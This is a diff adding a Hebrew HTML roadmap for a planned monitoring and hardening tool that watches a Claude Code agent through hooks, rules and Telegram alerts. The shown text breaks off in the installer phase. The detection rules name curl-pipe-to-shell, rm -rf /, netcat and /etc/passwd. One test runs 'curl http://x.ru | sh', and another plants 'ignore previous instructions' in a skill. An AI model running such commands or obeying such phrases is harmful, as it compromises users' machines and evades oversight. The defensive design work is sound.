@@ -1,0 +1,3478 @@
+<!DOCTYPE html>
+<html lang="he" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>EHZ-SEC-AI — תוכנית עבודה</title>
+<style>
+  :root {
+    --bg: #0a0e1a;
+    --panel: #111827;
+    --border: #1e2d45;
+    --accent: #0ea5e9;
+    --accent2: #6366f1;
+    --green: #10b981;
+    --yellow: #f59e0b;
+    --red: #ef4444;
+    --orange: #f97316;
+    --text: #e2e8f0;
+    --muted: #64748b;
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Segoe UI', Arial, sans-serif;
+    min-height: 100vh;
+    padding: 32px 24px;
+  }
+
+  /* ── HEADER ── */
+  .header {
+    text-align: center;
+    margin-bottom: 48px;
+  }
+  .header-badge {
+    display: inline-block;
+    background: linear-gradient(135deg, #0ea5e9, #6366f1);
+    color: #fff;
+    font-size: 11px;
+    font-weight: 700;
+    letter-spacing: 3px;
+    padding: 4px 14px;
+    border-radius: 20px;
+    margin-bottom: 16px;
+    text-transform: uppercase;
+  }
+  .header h1 {
+    font-size: 42px;
+    font-weight: 900;
+    letter-spacing: -1px;
+    background: linear-gradient(135deg, #e2e8f0, #0ea5e9);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+  }
+  .header p {
+    color: var(--muted);
+    font-size: 15px;
+    margin-top: 10px;
+  }
+
+  /* ── PHASES ROW ── */
+  .phases-row {
+    display: flex;
+    gap: 12px;
+    justify-content: center;
+    margin-bottom: 48px;
+    flex-wrap: wrap;
+  }
+  .phase-pill {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-radius: 999px;
+    padding: 8px 20px;
+    font-size: 13px;
+    font-weight: 600;
+  }
+  .phase-pill.active { border-color: var(--accent); color: var(--accent); }
+  .phase-pill.future { color: var(--muted); }
+  .phase-dot {
+    width: 8px; height: 8px;
+    border-radius: 50%;
+    background: currentColor;
+  }
+  .phase-arrow { color: var(--muted); font-size: 18px; margin: 0 4px; }
+
+  /* ── SECTION TITLE ── */
+  .section-title {
+    font-size: 11px;
+    font-weight: 700;
+    letter-spacing: 3px;
+    color: var(--muted);
+    text-transform: uppercase;
+    margin-bottom: 20px;
+    margin-top: 40px;
+  }
+
+  /* ── HARDWARE CARD ── */
+  .hw-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
+    gap: 16px;
+    margin-bottom: 12px;
+  }
+  .hw-card {
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-radius: 14px;
+    padding: 20px;
+  }
+  .hw-card-title {
+    font-size: 11px;
+    font-weight: 700;
+    letter-spacing: 2px;
+    color: var(--muted);
+    text-transform: uppercase;
+    margin-bottom: 10px;
+  }
+  .hw-row {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 7px 0;
+    border-bottom: 1px solid var(--border);
+    font-size: 13px;
+  }
+  .hw-row:last-child { border-bottom: none; }
+  .hw-label { color: var(--muted); }
+  .hw-value { font-weight: 600; }
+  .hw-value.ok { color: var(--green); }
+  .hw-value.warn { color: var(--yellow); }
+  .hw-value.min { color: var(--muted); }
+
+  .hw-note {
+    background: rgba(14,165,233,0.08);
+    border: 1px solid rgba(14,165,233,0.2);
+    border-radius: 10px;
+    padding: 12px 16px;
+    font-size: 13px;
+    color: var(--accent);
+    margin-top: 12px;
+  }
+
+  /* ── PHASE BLOCK ── */
+  .phase-block {
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-radius: 16px;
+    overflow: hidden;
+    margin-bottom: 24px;
+  }
+  .phase-header {
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    padding: 20px 24px;
+    border-bottom: 1px solid var(--border);
+  }
+  .phase-num {
+    width: 44px; height: 44px;
+    border-radius: 12px;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 20px; font-weight: 900;
+    flex-shrink: 0;
+  }
+  .phase-num.a { background: linear-gradient(135deg, #0ea5e9, #6366f1); color: #fff; }
+  .phase-num.b { background: rgba(249,115,22,0.15); color: var(--orange); border: 1px solid rgba(249,115,22,0.3); }
+  .phase-num.c { background: rgba(239,68,68,0.1); color: var(--red); border: 1px solid rgba(239,68,68,0.3); }
+  .phase-num.d { background: rgba(16,185,129,0.1); color: var(--green); border: 1px solid rgba(16,185,129,0.3); }
+
+  .phase-info h3 { font-size: 17px; font-weight: 700; }
+  .phase-info p { font-size: 13px; color: var(--muted); margin-top: 3px; }
+
+  .phase-status {
+    margin-right: auto;
+    font-size: 11px;
+    font-weight: 700;
+    letter-spacing: 1px;
+    padding: 4px 12px;
+    border-radius: 20px;
+  }
+  .status-active { background: rgba(14,165,233,0.15); color: var(--accent); border: 1px solid rgba(14,165,233,0.3); }
+  .status-next { background: rgba(249,115,22,0.1); color: var(--orange); border: 1px solid rgba(249,115,22,0.3); }
+  .status-future { background: rgba(100,116,139,0.1); color: var(--muted); border: 1px solid var(--border); }
+
+  /* ── TASKS ── */
+  .tasks-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+    gap: 1px;
+    background: var(--border);
+  }
+  .task-cell {
+    background: var(--panel);
+    padding: 18px 24px;
+  }
+  .task-num {
+    font-size: 10px;
+    font-weight: 700;
+    letter-spacing: 2px;
+    color: var(--muted);
+    margin-bottom: 8px;
+  }
+  .task-title {
+    font-size: 14px;
+    font-weight: 700;
+    margin-bottom: 6px;
+  }
+  .task-desc {
+    font-size: 12px;
+    color: var(--muted);
+    line-height: 1.6;
+  }
+  .task-tags {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 5px;
+    margin-top: 10px;
+  }
+  .tag {
+    font-size: 10px;
+    font-weight: 600;
+    padding: 2px 8px;
+    border-radius: 20px;
+    background: rgba(99,102,241,0.1);
+    color: var(--accent2);
+    border: 1px solid rgba(99,102,241,0.2);
+  }
+
+  /* ── TECH STACK ── */
+  .stack-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
+    gap: 12px;
+    margin-bottom: 40px;
+  }
+  .stack-card {
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    padding: 16px;
+    text-align: center;
+  }
+  .stack-icon { font-size: 24px; margin-bottom: 8px; }
+  .stack-name { font-size: 13px; font-weight: 700; }
+  .stack-role { font-size: 11px; color: var(--muted); margin-top: 4px; }
+
+  /* ── DELIVERABLES ── */
+  .deliver-list {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(240px, 1fr));
+    gap: 12px;
+    margin-bottom: 40px;
+  }
+  .deliver-item {
+    display: flex;
+    align-items: flex-start;
+    gap: 12px;
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    padding: 14px 16px;
+  }
+  .deliver-check {
+    width: 22px; height: 22px;
+    border-radius: 6px;
+    border: 2px solid var(--border);
+    flex-shrink: 0;
+    margin-top: 1px;
+  }
+  .deliver-text { font-size: 13px; }
+  .deliver-text strong { display: block; font-weight: 700; margin-bottom: 2px; }
+  .deliver-text span { color: var(--muted); font-size: 12px; }
+
+  /* ── FOOTER ── */
+  .footer {
+    text-align: center;
+    color: var(--muted);
+    font-size: 12px;
+    margin-top: 60px;
+    padding-top: 24px;
+    border-top: 1px solid var(--border);
+  }
+  .footer strong { color: var(--green); }
+</style>
+</head>
+<body>
+
+<!-- HEADER -->
+<div class="header">
+  <div class="header-badge">EHZ Security AI</div>
+  <h1>EHZ-SEC-AI</h1>
+  <p>Claude Code Security Monitor — תוכנית עבודה ושלבי פיתוח</p>
+</div>
+
+<!-- PROGRESS TRACKER -->
+<div style="background:var(--panel);border:1px solid var(--border);border-radius:16px;padding:24px;margin-bottom:32px;">
+
+  <!-- Overall progress -->
+  <div style="display:flex;align-items:center;gap:20px;margin-bottom:24px;flex-wrap:wrap;">
+    <div style="text-align:center;min-width:90px;">
+      <div style="font-size:48px;font-weight:900;line-height:1;" id="pct-total">0%</div>
+      <div style="font-size:11px;color:var(--muted2);margin-top:4px;letter-spacing:1px;text-transform:uppercase;">הושלם</div>
+    </div>
+    <div style="flex:1;min-width:200px;">
+      <div style="display:flex;justify-content:space-between;font-size:11px;color:var(--muted2);margin-bottom:6px;">
+        <span>התקדמות כוללת</span>
+        <span id="pct-label">0 / 12 Milestones</span>
+      </div>
+      <div style="height:10px;background:var(--border);border-radius:999px;overflow:hidden;">
+        <div id="bar-total" style="height:100%;width:0%;background:linear-gradient(90deg,#0ea5e9,#6366f1);border-radius:999px;transition:width 0.5s;"></div>
+      </div>
+      <div style="display:flex;gap:16px;margin-top:10px;font-size:11px;flex-wrap:wrap;">
+        <span style="color:var(--green);">● <span id="cnt-done">0</span> הושלם</span>
+        <span style="color:var(--accent);">● <span id="cnt-progress">0</span> בתהליך</span>
+        <span style="color:var(--muted2);">● <span id="cnt-pending">0</span> ממתין</span>
+      </div>
+    </div>
+    <!-- Last updated -->
+    <div style="text-align:center;background:rgba(16,185,129,0.07);border:1px solid rgba(16,185,129,0.2);border-radius:10px;padding:10px 16px;">
+      <div style="font-size:10px;color:var(--muted2);margin-bottom:3px;">עדכון אחרון</div>
+      <div style="font-size:13px;font-weight:700;color:var(--green);" id="last-updated">אפריל 2026</div>
+    </div>
+  </div>
+
+  <!-- Per-milestone status -->
+  <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:8px;" id="milestone-grid">
+
+    <!-- Each milestone row: data-status = "done" | "active" | "pending" -->
+    <div class="ms-row" data-status="pending" data-num="1" data-name="Hook + Collector + Telegram">
+    </div>
+    <div class="ms-row" data-status="pending" data-num="2" data-name="Anomaly Rules + Whitelist">
+    </div>
+    <div class="ms-row" data-status="pending" data-num="3" data-name="Dashboard UI">
+    </div>
+    <div class="ms-row" data-status="pending" data-num="4" data-name="Hardening Levels">
+    </div>
+    <div class="ms-row" data-status="pending" data-num="5" data-name="Skill Scanner">
+    </div>
+    <div class="ms-row" data-status="pending" data-num="6" data-name="Secrets + DLP">
+    </div>
+    <div class="ms-row" data-status="pending" data-num="7" data-name="ניטור מתקדם">
+    </div>
+    <div class="ms-row" data-status="pending" data-num="8" data-name="Installer Package">
+    </div>
+    <div class="ms-row" data-status="pending" data-num="9" data-name="Domain + Kamatera">
+    </div>
+    <div class="ms-row" data-status="pending" data-num="10" data-name="Block Mode">
+    </div>
+    <div class="ms-row" data-status="pending" data-num="11" data-name="SIEM + Network">
+    </div>
+    <div class="ms-row" data-status="pending" data-num="12" data-name="שיפורים מהמחקר — Gap Fix">
+    </div>
+
+  </div>
+</div>
+
+<style>
+  .ms-row {
+    display:flex; align-items:center; gap:10px;
+    background:rgba(255,255,255,0.02);
+    border:1px solid var(--border);
+    border-radius:10px;
+    padding:10px 14px;
+    font-size:12px;
+    cursor:pointer;
+    transition:all 0.15s;
+    user-select:none;
+  }
+  .ms-row:hover { background:rgba(255,255,255,0.04); border-color:var(--border2); }
+  .ms-row[data-status="done"] { border-color:rgba(16,185,129,0.3); background:rgba(16,185,129,0.05); }
+  .ms-row[data-status="active"] { border-color:rgba(14,165,233,0.4); background:rgba(14,165,233,0.06); }
+  .ms-num {
+    width:26px; height:26px; border-radius:7px;
+    display:flex; align-items:center; justify-content:center;
+    font-size:12px; font-weight:800; flex-shrink:0;
+    background:var(--border2); color:var(--muted2);
+  }
+  .ms-row[data-status="done"] .ms-num { background:rgba(16,185,129,0.2); color:var(--green); }
+  .ms-row[data-status="active"] .ms-num { background:rgba(14,165,233,0.2); color:var(--accent); }
+  .ms-name { flex:1; font-weight:600; color:var(--muted2); }
+  .ms-row[data-status="done"] .ms-name { color:var(--text); }
+  .ms-row[data-status="active"] .ms-name { color:var(--accent); }
+  .ms-icon { font-size:14px; }
+  .ms-phase {
+    font-size:9px; font-weight:700; letter-spacing:1px; text-transform:uppercase;
+    padding:2px 7px; border-radius:4px;
+  }
+  .ms-phase.a { background:rgba(14,165,233,0.1); color:var(--accent); }
+  .ms-phase.b { background:rgba(245,158,11,0.1); color:var(--yellow); }
+  .ms-phase.c { background:rgba(239,68,68,0.1); color:var(--red); }
+  .ms-phase.d { background:rgba(16,185,129,0.1); color:var(--green); }
+</style>
+
+<script>
+(function() {
+  const PHASES = {
+    1:'a',2:'a',3:'a',4:'a',5:'a',6:'a',7:'a',8:'a',9:'b',10:'c',11:'d'
+  };
+  const PHASE_LABELS = { a:'שלב א', b:'שלב ב', c:'שלב ג', d:'שלב ד' };
+
+  function buildMilestones() {
+    document.querySelectorAll('.ms-row').forEach(row => {
+      const num = row.dataset.num;
+      const name = row.dataset.name;
+      const status = row.dataset.status;
+      const phase = PHASES[num];
+      const icon = status === 'done' ? '✅' : status === 'active' ? '▶' : '⏳';
+
+      row.innerHTML = `
+        <div class="ms-num">${num}</div>
+        <div class="ms-name">${name}</div>
+        <span class="ms-icon">${icon}</span>
+        <span class="ms-phase ${phase}">${PHASE_LABELS[phase]}</span>
+      `;
+
+      // click to cycle: pending → active → done → pending
+      row.addEventListener('click', () => {
+        const s = row.dataset.status;
+        row.dataset.status = s === 'pending' ? 'active' : s === 'active' ? 'done' : 'pending';
+        buildMilestones();
+        updateTotals();
+      });
+    });
+  }
+
+  function updateTotals() {
+    const rows = document.querySelectorAll('.ms-row');
+    let done = 0, active = 0, pending = 0;
+    rows.forEach(r => {
+      if (r.dataset.status === 'done') done++;
+      else if (r.dataset.status === 'active') active++;
+      else pending++;
+    });
+    const total = rows.length;
+    const pct = Math.round((done / total) * 100);
+
+    document.getElementById('pct-total').textContent = pct + '%';
+    document.getElementById('pct-total').style.color =
+      pct === 100 ? 'var(--green)' : pct > 50 ? 'var(--accent)' : pct > 0 ? 'var(--yellow)' : 'var(--muted2)';
+    document.getElementById('bar-total').style.width = pct + '%';
+    document.getElementById('pct-label').textContent = `${done} / 12 Milestones`;
+    document.getElementById('cnt-done').textContent = done;
+    document.getElementById('cnt-progress').textContent = active;
+    document.getElementById('cnt-pending').textContent = pending;
+
+    const now = new Date();
+    document.getElementById('last-updated').textContent =
+      now.toLocaleDateString('he-IL', { day:'numeric', month:'long', year:'numeric' });
+  }
+
+  buildMilestones();
+  updateTotals();
+})();
+</script>
+
+<!-- PHASES PILLS -->
+<div class="phases-row">
+  <div class="phase-pill active">
+    <div class="phase-dot"></div>
+    שלב א — תחנה יחידה
+  </div>
+  <div class="phase-arrow">→</div>
+  <div class="phase-pill future">
+    <div class="phase-dot"></div>
+    שלב ב — Domain
+  </div>
+  <div class="phase-arrow">→</div>
+  <div class="phase-pill future">
+    <div class="phase-dot"></div>
+    שלב ג — Block Mode
+  </div>
+  <div class="phase-arrow">→</div>
+  <div class="phase-pill future">
+    <div class="phase-dot"></div>
+    שלב ד — SIEM
+  </div>
+</div>
+
+<!-- MASTER ROADMAP -->
+<div class="section-title">תוכנית עבודה מדורגת — Master Roadmap</div>
+
+<div style="background:rgba(14,165,233,0.07);border:1px solid rgba(14,165,233,0.2);border-radius:12px;padding:14px 18px;margin-bottom:20px;font-size:13px;color:var(--accent);">
+  📌 כל milestone מסתיים בבדיקה — רק אחרי שהבדיקה עוברת ממשיכים למilestone הבא. בעיה = ידוע בדיוק באיזה שלב.
+</div>
+
+<!-- PHASE 1 -->
+<div class="phase-block" style="margin-bottom:12px;">
+  <div class="phase-header">
+    <div class="phase-num a" style="font-size:13px;width:48px;height:48px;">1</div>
+    <div class="phase-info">
+      <h3>שלב 1 — תשתית בסיסית (Core)</h3>
+      <p>Hook + Collector + DB + Telegram · תחנה יחידה</p>
+    </div>
+    <div class="phase-status status-active">▶ מתחילים כאן</div>
+  </div>
+  <div class="tasks-grid">
+    <div class="task-cell">
+      <div class="task-num">1.1</div>
+      <div class="task-title">Agent Hook</div>
+      <div class="task-desc">hook.js מופעל ב-PreToolUse/PostToolUse. שולח event בסיסי ל-Collector.</div>
+      <div class="task-tags"><span class="tag">hook.js</span></div>
+    </div>
+    <div class="task-cell">
+      <div class="task-num">1.2</div>
+      <div class="task-title">Collector + SQLite</div>
+      <div class="task-desc">Express port 3010. קבלת events, שמירה ב-SQLite. API בסיסי לdashboard.</div>
+      <div class="task-tags"><span class="tag">collector</span><span class="tag">SQLite</span></div>
+    </div>
+    <div class="task-cell">
+      <div class="task-num">1.3</div>
+      <div class="task-title">Telegram Alerts</div>
+      <div class="task-desc">התראה על כל event. בדיקה שהbot מקבל הודעות מהcollector.</div>
+      <div class="task-tags"><span class="tag">telegram</span></div>
+    </div>
+    <div class="task-cell">
+      <div class="task-num">1.4</div>
+      <div class="task-title">Installer</div>
+      <div class="task-desc">install.ps1 — בדיקת Claude Code, כתיבת hooks לsettings.json, machine token.</div>
+      <div class="task-tags"><span class="tag">installer</span></div>
+    </div>
+  </div>
+  <div style="background:rgba(16,185,129,0.07);border-top:1px solid var(--border);padding:12px 20px;font-size:12px;">
+    <span style="color:var(--green);font-weight:700;">✅ בדיקת קבלה:</span>
+    <span style="color:var(--muted2);"> הרץ Claude → בצע Bash פשוט → ראה event ב-SQLite → קבל הודעת Telegram</span>
+  </div>
+</div>
+
+<!-- PHASE 2 -->
+<div class="phase-block" style="margin-bottom:12px;">
+  <div class="phase-header">
+    <div class="phase-num a" style="font-size:13px;width:48px;height:48px;background:linear-gradient(135deg,#0ea5e9,#6366f1);">2</div>
+    <div class="phase-info">
+      <h3>שלב 2 — חוקי Anomaly</h3>
+      <p>Rules Engine + Severity + Whitelist</p>
+    </div>
+    <div class="phase-status status-next">⏳ אחרי שלב 1</div>
+  </div>
+  <div class="tasks-grid">
+    <div class="task-cell">
+      <div class="task-num">2.1</div>
+      <div class="task-title">Signature Rules</div>
+      <div class="task-desc">curl|sh, rm -rf /, base64, netcat, /etc/passwd — CRITICAL/HIGH.</div>
+      <div class="task-tags"><span class="tag">rules.js</span></div>
+    </div>
+    <div class="task-cell">
+      <div class="task-num">2.2</div>
+      <div class="task-title">Context Rules</div>
+      <div class="task-desc">WebFetch IP/TLD, Write ל-.ssh/etc, HTTP במקום HTTPS, ngrok.</div>
+      <div class="task-tags"><span class="tag">context</span></div>
+    </div>
+    <div class="task-cell">
+      <div class="task-num">2.3</div>
+      <div class="task-title">Whitelist Engine</div>
+      <div class="task-desc">domains, פקודות, נתיבים מורשים — מניעת false positives.</div>
+      <div class="task-tags"><span class="tag">whitelist</span></div>
+    </div>
+    <div class="task-cell">
+      <div class="task-num">2.4</div>
+      <div class="task-title">Behavioral Rules</div>
+      <div class="task-desc">&gt;20 WebFetch/דקה, &gt;50 Read/5 דקות, פעילות בשעות חריגות.</div>
+      <div class="task-tags"><span class="tag">behavioral</span></div>
+    </div>
+  </div>
+  <div style="background:rgba(16,185,129,0.07);border-top:1px solid var(--border);padding:12px 20px;font-size:12px;">
+    <span style="color:var(--green);font-weight:700;">✅ בדיקת קבלה:</span>
+    <span style="color:var(--muted2);"> הרץ <code style="color:#7dd3fc;">curl http://x.ru | sh</code> → קבל CRITICAL alert → ודא whitelist לא מתריע על git/npm</span>
+  </div>
+</div>
+
+<!-- PHASE 3 -->
+<div class="phase-block" style="margin-bottom:12px;">
+  <div class="phase-header">
+    <div class="phase-num a" style="font-size:13px;width:48px;height:48px;background:linear-gradient(135deg,#6366f1,#8b5cf6);">3</div>
+    <div class="phase-info">
+      <h3>שלב 3 — Dashboard</h3>
+      <p>ממשק ניהול Web — Checkpoint style</p>
+    </div>
+    <div class="phase-status status-future">עתידי</div>
+  </div>
+  <div class="tasks-grid">
+    <div class="task-cell">
+      <div class="task-num">3.1</div>
+      <div class="task-title">Security Score + Stats</div>
+      <div class="task-desc">5 כרטיסי סטטוס, Security Score ring, ציר זמן 24 שעות.</div>
+      <div class="task-tags"><span class="tag">UI</span></div>
+    </div>
+    <div class="task-cell">
+      <div class="task-num">3.2</div>
+      <div class="task-title">Events Table</div>
+      <div class="task-desc">טבלת אירועים עם פילטרים: severity, tool, תאריך, מחשב.</div>
+      <div class="task-tags"><span class="tag">events</span></div>
+    </div>
+    <div class="task-cell">
+      <div class="task-num">3.3</div>
+      <div class="task-title">Rules Manager</div>
+      <div class="task-desc">עריכת חוקים + whitelist מה-UI. הוספה/הסרה ללא נגיעה בקוד.</div>
+      <div class="task-tags"><span class="tag">rules UI</span></div>
+    </div>
+    <div class="task-cell">
+      <div class="task-num">3.4</div>
+      <div class="task-title">Hardening Panel</div>
+      <div class="task-desc">בחירת Level 0-3 לכל פרויקט. הגדרת project scope.</div>
+      <div class="task-tags"><span class="tag">hardening</span></div>
+    </div>
+  </div>
+  <div style="background:rgba(16,185,129,0.07);border-top:1px solid var(--border);padding:12px 20px;font-size:12px;">
+    <span style="color:var(--green);font-weight:700;">✅ בדיקת קבלה:</span>
+    <span style="color:var(--muted2);"> פתח dashboard → ראה events בזמן אמת → שנה חוק → ודא שינוי בא לידי ביטוי</span>
+  </div>
+</div>
+
+<!-- PHASE 4 -->
+<div class="phase-block" style="margin-bottom:12px;">
+  <div class="phase-header">
+    <div class="phase-num a" style="font-size:13px;width:48px;height:48px;background:linear-gradient(135deg,#f97316,#ef4444);">4</div>
+    <div class="phase-info">
+      <h3>שלב 4 — Hardening + Project Scope</h3>
+      <p>הגבלת גישה לתיקיית פרויקט, Level 0-3, אישור ידני</p>
+    </div>
+    <div class="phase-status status-future">עתידי</div>
+  </div>
+  <div class="tasks-grid">
+    <div class="task-cell">
+      <div class="task-num">4.1</div>
+      <div class="task-title">Project Scope Engine</div>
+      <div class="task-desc">בדיקת כל Read/Write מול רשימת project_roots. חסימה לפי Level.</div>
+      <div class="task-tags"><span class="tag">scope</span></div>
+    </div>
+    <div class="task-cell">
+      <div class="task-num">4.2</div>
+      <div class="task-title">Level 1 — SOFT</div>
+      <div class="task-desc">התראה + Telegram על כל חריגה מהפרויקט. ממשיך לעבוד.</div>
+      <div class="task-tags"><span class="tag">level 1</span></div>
+    </div>
+    <div class="task-cell">
+      <div class="task-num">4.3</div>
+      <div class="task-title">Level 2 — STRICT + אישור</div>
+      <div class="task-desc">חסימה + Telegram עם /approve_ID / /deny_ID. timeout 60 שניות.</div>
+      <div class="task-tags"><span class="tag">level 2</span></div>
+    </div>
+    <div class="task-cell">
+      <div class="task-num">4.4</div>
+      <div class="task-title">Level 3 — LOCKDOWN</div>
+      <div class="task-desc">רק תיקיית פרויקט. כל שאר → חסום אוטומטי ללא אישור.</div>
+      <div class="task-tags"><span class="tag">level 3</span></div>
+    </div>
+  </div>
+  <div style="background:rgba(16,185,129,0.07);border-top:1px solid var(--border);padding:12px 20px;font-size:12px;">
+    <span style="color:var(--green);font-weight:700;">✅ בדיקת קבלה:</span>
+    <span style="color:var(--muted2);"> הגדר Level 2 → נסה לכתוב מחוץ לפרויקט → קבל Telegram → אשר/דחה → ודא תגובה</span>
+  </div>
+</div>
+
+<!-- PHASE 5 -->
+<div class="phase-block" style="margin-bottom:12px;">
+  <div class="phase-header">
+    <div class="phase-num a" style="font-size:13px;width:48px;height:48px;background:linear-gradient(135deg,#10b981,#059669);">5</div>
+    <div class="phase-info">
+      <h3>שלב 5 — Skill Security + Pre-Install Scanner</h3>
+      <p>סריקת סקילים לפני הפעלה, Hash integrity, Quarantine</p>
+    </div>
+    <div class="phase-status status-future">עתידי</div>
+  </div>
+  <div class="tasks-grid">
+    <div class="task-cell">
+      <div class="task-num">5.1</div>
+      <div class="task-title">Hash Registry</div>
+      <div class="task-desc">SHA-256 לכל סקיל. בדיקה בכל הפעלה — שינוי = CRITICAL.</div>
+      <div class="task-tags"><span class="tag">hash</span></div>
+    </div>
+    <div class="task-cell">
+      <div class="task-num">5.2</div>
+      <div class="task-title">YARA + Semgrep + ClamAV</div>
+      <div class="task-desc">3 מנועים מקומיים חינמיים. רצים לפני כל הפעלת סקיל.</div>
+      <div class="task-tags"><span class="tag">local scan</span></div>
+    </div>
+    <div class="task-cell">
+      <div class="task-num">5.3</div>
+      <div class="task-title">OpenAI Mod + Safe Browsing</div>
+      <div class="task-desc">APIs חינמיים — ניתוח תוכן + בדיקת URLs בסקיל.</div>
+      <div class="task-tags"><span class="tag">API scan</span></div>
+    </div>
+    <div class="task-cell">
+      <div class="task-num">5.4</div>
+      <div class="task-title">Quarantine System</div>
+      <div class="task-desc">סקיל שנכשל → הסגר אוטומטי + לא פועל עד אישור ידני.</div>
+      <div class="task-tags"><span class="tag">quarantine</span></div>
+    </div>
+  </div>
+  <div style="background:rgba(16,185,129,0.07);border-top:1px solid var(--border);padding:12px 20px;font-size:12px;">
+    <span style="color:var(--green);font-weight:700;">✅ בדיקת קבלה:</span>
+    <span style="color:var(--muted2);"> הכנס "ignore previous instructions" לסקיל → ודא שנחסם → ודא hash alert על שינוי קובץ</span>
+  </div>
+</div>
+
+<!-- PHASE 6 -->
+<div class="phase-block" style="margin-bottom:12px;">
+  <div class="phase-header">
+    <div class="phase-num a" style="font-size:13px;width:48px;height:48px;background:linear-gradient(135deg,#ef4444,#dc2626);">6</div>
+    <div class="phase-info">
+      <h3>שלב 6 — Secrets Scanner + DLP</h3>
+      <p>גילוי סיסמאות, API keys, כרטיסי אשראי, ת"ז בקבצי פרויקט</p>
+    </div>
+    <div class="phase-status status-future">עתידי</div>
+  </div>
+  <div class="tasks-grid">
+    <div class="task-cell">
+      <div class="task-num">6.1</div>
+      <div class="task-title">Secrets Patterns</div>
+      <div class="task-desc">סיסמאות, API keys (OpenAI/AWS/GitHub), JWT, Private Keys, Connection Strings.</div>
+      <div class="task-tags"><span class="tag">secrets</span></div>
+    </div>
+    <div class="task-cell">
+      <div class="task-num">6.2</div>
+      <div class="task-title">פרטים אישיים ישראליים</div>
+      <div class="task-desc">ת"ז, כרטיסי אשראי (Visa/MC/Amex), מספרי פלאפון, מספרי חשבון.</div>
+      <div class="task-tags"><span class="tag">PII</span><span class="tag">ישראלי</span></div>
+    </div>
+    <div class="task-cell">
+      <div class="task-num">6.3</div>
+      <div class="task-title">Project Full Scan</div>
+      <div class="task-desc">סריקת כל תיקיית פרויקט לפי דרישה + דוח HTML מפורט.</div>
+      <div class="task-tags"><span class="tag">full scan</span></div>
+    </div>
+    <div class="task-cell">
+      <div class="task-num">6.4</div>
+      <div class="task-title">Real-time Write Guard</div>
+      <div class="task-desc">כל קובץ שנכתב עובר סריקה מיידית. מידע רגיש = CRITICAL + חסום commit.</div>
+      <div class="task-tags"><span class="tag">write guard</span></div>
+    </div>
+  </div>
+  <div style="background:rgba(16,185,129,0.07);border-top:1px solid var(--border);padding:12px 20px;font-size:12px;">
+    <span style="color:var(--green);font-weight:700;">✅ בדיקת קבלה:</span>
+    <span style="color:var(--muted2);"> כתוב password=Test123 לקובץ → קבל CRITICAL alert → הרץ full scan → ודא דוח מציג ממצאים</span>
+  </div>
+</div>
+
+<!-- PHASE 7 -->
+<div class="phase-block" style="margin-bottom:12px;">
+  <div class="phase-header">
+    <div class="phase-num a" style="font-size:13px;width:48px;height:48px;background:linear-gradient(135deg,#8b5cf6,#6366f1);">7</div>
+    <div class="phase-info">
+      <h3>שלב 7 — ניטור מתקדם</h3>
+      <p>FS Watcher, Session Recording, Process Monitor, Git Monitor, Env Vars, Immutable Log</p>
+    </div>
+    <div class="phase-status status-future">עתידי</div>
+  </div>
+  <div class="tasks-grid">
+    <div class="task-cell">
+      <div class="task-num">7.1</div>
+      <div class="task-title">File System Watcher</div>
+      <div class="task-desc">ניטור FS ברמת OS — כל שינוי קובץ, גם אם Claude לא "דיווח".</div>
+      <div class="task-tags"><span class="tag">FSW</span></div>
+    </div>
+    <div class="task-cell">
+      <div class="task-num">7.2</div>
+      <div class="task-title">Session Recording</div>
+      <div class="task-desc">תיעוד כל session: prompt → tools → תשובות. ניתן לשחזר אחר כך.</div>
+      <div class="task-tags"><span class="tag">recording</span></div>
+    </div>
+    <div class="task-cell">
+      <div class="task-num">7.3</div>
+      <div class="task-title">Process Tree Monitor</div>
+      <div class="task-desc">עקוב אחרי child processes של Claude. kill תהליכים חשודים.</div>
+      <div class="task-tags"><span class="tag">process</span></div>
+    </div>
+    <div class="task-cell">
+      <div class="task-num">7.4</div>
+      <div class="task-title">Git + Env + Clipboard</div>
+      <div class="task-desc">ניטור commits, גישה ל-.env/API keys, כתיבה לclipboard.</div>
+      <div class="task-tags"><span class="tag">git</span><span class="tag">env</span></div>
+    </div>
+    <div class="task-cell">
+      <div class="task-num">7.5</div>
+      <div class="task-title">Immutable Audit Log</div>
+      <div class="task-desc">hash chain לוג — כל entry חתום. לא ניתן לשנות רטרואקטיבית.</div>
+      <div class="task-tags"><span class="tag">immutable</span></div>
+    </div>
+    <div class="task-cell">
+      <div class="task-num">7.6</div>
+      <div class="task-title">Behavioral Baseline</div>
+      <div class="task-desc">למידת "רגיל" עבורך. חריגה מbaseline → alert אוטומטי.</div>
+      <div class="task-tags"><span class="tag">baseline</span></div>
+    </div>
+  </div>
+  <div style="background:rgba(16,185,129,0.07);border-top:1px solid var(--border);padding:12px 20px;font-size:12px;">
+    <span style="color:var(--green);font-weight:700;">✅ בדיקת קבלה:</span>
+    <span style="color:var(--muted2);"> שנה קובץ ישירות (לא דרך Claude) → FS Watcher מזהה → Session playback עובד</span>
+  </div>
+</div>
+
+<!-- PHASE 8 — INSTALLER PACKAGE -->
+<div class="phase-block" style="margin-bottom:12px;">
+  <div class="phase-header">
+    <div class="phase-num a" style="font-size:13px;width:48px;height:48px;background:linear-gradient(135deg,#0ea5e9,#10b981);">8</div>
+    <div class="phase-info">
+      <h3>שלב 8 — חבילת התקנה (Standalone Installer)</h3>
+      <p>MSI / ZIP / CLI installer — פריסה על מחשב בודד בלחיצה אחת</p>
+    </div>
+    <div class="phase-status status-future">סיום שלב א</div>
